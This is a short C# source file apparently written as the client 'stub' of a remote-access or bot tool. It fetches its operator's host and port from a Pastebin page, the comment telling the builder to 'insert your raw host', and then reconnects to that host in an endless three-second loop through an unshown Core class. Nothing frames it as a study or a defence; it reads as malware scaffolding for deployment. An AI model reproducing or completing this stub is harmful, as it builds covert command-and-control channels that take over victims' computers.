using System;
using System.Net;
using System.Threading;

namespace stub
{
    class Program
	{
        private static string th;
        private static string tp;

        static void Main(string[] args)
		{
            string str;

            try
            {
               
                string[] strArr;
                int count;
                //INSERT YOUR RAW HOST HERE IN PASTEBIN. (HOST:PORT)
                str = new WebClient().DownloadString("https://pastebin.com/raw/x");
                strArr = str.Split(Convert.ToChar(":"));
                for (count = 0; count <= strArr.Length - 1; count++)
                {
                   th = strArr[0];
                   tp = strArr[1];
                }

                while (true)
				{
					Core.Run((th),Convert.ToUInt16(tp));
					Core.Wait();

					Thread.Sleep(3000);
				}
			}
			catch(Exception ex)
            {
				Console.WriteLine(ex.Message);
            }
		}
	}
}
